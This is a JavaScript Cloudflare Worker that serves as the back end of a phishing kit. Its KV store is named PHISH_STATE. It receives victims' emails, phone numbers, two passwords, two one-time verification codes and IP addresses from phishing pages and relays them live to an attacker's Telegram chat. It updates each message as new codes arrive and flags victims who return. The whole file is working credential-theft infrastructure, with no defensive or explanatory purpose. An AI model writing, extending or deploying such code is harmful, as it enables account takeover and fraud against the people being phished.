/**
 * Cloudflare Worker — Telegram forwarder (KV + edit-in-place + CORS)
 */

// ============================================================
// Helpers
// ============================================================
function esc(s) {
  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

async function tg(token, method, body) {
  const r = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify(body)
  });
  return r.json();
}

function parseFields(type, html, prev) {
  const f = {...prev};
  let changed = null;
  let m;

  m = html.match(/Email:\s*<code>(.*?)<\/code>/);
  if (m) f.email = m[1];

  m = html.match(/Phone:\s*<code>(.*?)<\/code>/);
  if (m) f.phone = m[1];

  m = html.match(/Password:\s*<code>(.*?)<\/code>/);
  if (m) {
    if (/PASSWORD 1/.test(html)) { f.ps1 = m[1]; changed = 'ps1'; }
    if (/PASSWORD 2/.test(html)) { f.ps2 = m[1]; changed = 'ps2'; }
  }

  m = html.match(/Code:\s*<code>(.*?)<\/code>/);
  if (m) {
    if (/CODE 1/.test(html)) { f.code1 = m[1]; changed = 'code1'; }
    if (/CODE 2/.test(html)) { f.code2 = m[1]; changed = 'code2'; }
  }

  return { fields: f, changed };
}

function render(sid, f, highlight) {
  const E = esc(f.email||''), P = esc(f.phone||'');
  const bold = (k, s) => highlight === k ? `<b>⚡</b> <code>${s}</code>` : `<code>${s}</code>`;
  const lines = [];
  if (f.logLai) lines.push('🔄 <b>LOG LẠI</b>');
  lines.push(`<b>🔴 #${esc(sid)}</b>`);
  lines.push(`📧 ${E ? `<code>${E}</code>` : '⋯⋯'}`);
  lines.push(`📱 ${P ? `<code>${P}</code>` : '⋯⋯'}`);
  lines.push(`🔑 ${f.ps1 ? bold('ps1', esc(f.ps1)) : ''}`);
  lines.push(`🔑 ${f.ps2 ? bold('ps2', esc(f.ps2)) : ''}`);
  lines.push(`🔐 ${f.code1 ? bold('code1', esc(f.code1)) : ''}`);
  lines.push(`🔐 ${f.code2 ? bold('code2', esc(f.code2)) + ' ✅' : ''}`);
  lines.push(`🌍 <i>${esc(f.ip||'⋯⋯')}</i>`);
  return lines.join('\n');
}

// ============================================================
// Rate limiter (in-memory, per IP: 30 req/min)
// ============================================================
const RL = new Map();
function rateLimited(ip) {
  const now = Date.now(), e = RL.get(ip);
  if (!e || now - e.ts > 60000) { RL.set(ip, {n:1, ts:now}); return false; }
  e.n++; if (e.n > 30) return true;
  return false;
}

// ============================================================
// CORS headers
// ============================================================
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type'
};

// ============================================================
// Main handler
// ============================================================
export default {
  async fetch(req, env) {
    // Handle CORS preflight
    if (req.method === 'OPTIONS') return new Response(null, {headers: CORS});
    if (req.method !== 'POST') return new Response('ok', {headers: CORS});

    const token  = env.TELEGRAM_BOT_TOKEN || '';
    const chatId = env.TELEGRAM_CHAT_ID   || '';
    if (!token || !chatId) return new Response('ok', {headers: CORS});

    let body;
    try { body = await req.json(); }
    catch { return new Response('ok', {headers: CORS}); }

    const { sid, type, payload, ip } = body;
    if (!sid || !type) return new Response('ok', {headers: CORS});

    // Rate limit
    if (ip && rateLimited(ip)) return new Response('ok', {headers: CORS});

    // Auth
    if (env.AUTH_SECRET && body.auth !== env.AUTH_SECRET) return new Response('ok', {headers: CORS});

    // ---- KV state ----
    const KV  = env.PHISH_STATE;
    const key = `msg_${sid}`;
    let state = { msgId:0, fields:{} };

    if (KV) try {
      const raw = await KV.get(key);
      if (raw) state = JSON.parse(raw);
    } catch {}

    // ---- update fields ----
    const parsed = parseFields(type, payload, state.fields);
    state.fields = parsed.fields;
    if (ip) state.fields.ip = ip;

    // ---- IP history (LOG LẠI) ----
    if (KV && ip && !state.msgId) {
      const ipKey = 'ip_' + ip.replace(/[.:]/g,'_');
      try {
        const old = await KV.get(ipKey);
        if (old) {
          const d = JSON.parse(old);
          if (d.sid !== sid) state.fields.logLai = true;
        }
        await KV.put(ipKey, JSON.stringify({sid, ts:Date.now()}), {expirationTtl: 86400});
      } catch {}
    }

    // ---- render ----
    const text = render(sid, state.fields, parsed.changed);

    // ---- send or edit ----
    let msgId = state.msgId;
    try {
      if (msgId) {
        if (text !== state.text) {
          const r = await tg(token, 'editMessageText', {
            chat_id: chatId, message_id: msgId,
            text, parse_mode: 'HTML', disable_web_page_preview: true
          });
          if (!r.ok) {
            const r2 = await tg(token, 'sendMessage', {
              chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true
            });
            if (r2.ok) msgId = r2.result.message_id;
          }
        }
      } else {
        const r = await tg(token, 'sendMessage', {
          chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true
        });
        if (r.ok) msgId = r.result.message_id;
      }
    } catch {}

    // ---- save state ----
    if (KV && msgId) {
      state.msgId = msgId;
      state.text = text;
      try { await KV.put(key, JSON.stringify(state), {expirationTtl: 86400}); }
      catch {}
    }

    return new Response('ok', {headers: CORS});
  }
};
